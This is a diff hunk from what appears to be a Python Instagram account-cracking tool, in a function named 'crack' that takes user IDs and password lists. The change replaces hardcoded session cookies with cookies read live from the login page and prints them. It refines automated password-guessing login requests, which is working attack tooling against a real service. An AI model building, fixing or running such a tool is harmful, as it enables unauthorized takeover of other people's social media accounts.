@@ -126,22 +126,16 @@ def crack(uid, pww, total_idz):
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             response = session.get('https://www.instagram.com/accounts/login/')
             csrf_token = response.cookies['csrftoken']
-            mid = response.cookies['mid']
-            ig_did = response.cookies['ig_did']
-            datr = response.cookies['datr']
-            print(f"\r\033[1;92m [cookie] {csrf_token}")
-            print(f"\r\033[1;92m [mid] {mid}")
-            print(f"\r\033[1;92m [ig_did] {ig_did}")
-            print(f"\r\033[1;92m [datr] {datr}")
-            cookies = {
-                'csrftoken': csrf_token,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
+            cookies = cookies = {
+    'csrftoken': csrf_token,
+    'mid': response.cookies.get('mid'),
+    'ig_did': response.cookies.get('ig_did'),
+    'datr': response.cookies.get('datr'),
+    'ig_nrcb': response.cookies.get('ig_nrcb', '1'),
+    'ps_l': response.cookies.get('ps_l', '1'),
+    'ps_n': response.cookies.get('ps_n', '1'),
+    'wd': response.cookies.get('wd', '885x773'),}
+            print(f"\r\033[1;92m [cookie] {cookies}")
             data = {
                 "enc_password": enc_password,
                 'optIntoOneTap': 'false',
